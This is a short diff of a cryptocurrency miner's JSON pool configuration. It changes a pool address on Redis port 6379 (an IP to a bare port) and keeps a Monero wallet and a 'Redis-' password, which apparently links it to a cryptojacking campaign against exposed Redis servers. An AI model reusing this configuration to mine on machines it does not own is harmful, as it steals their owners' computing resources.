@@ -66,7 +66,7 @@
         {
             "algo": null,
             "coin": null,
-            "url": "185.128.105.202:6379",
+            "url": ":6379",
             "user": "49196hYibtceivQiuyXctAVjMhsD5uRptifoHyrTjmJZ8hoGLnZh7x6dZDFw4mgHkaBJPVx5dhWDZ6GKXL5J6WLZJkgkxK4",
             "pass": "Redis-~rx/0",
             "rig-id": null,
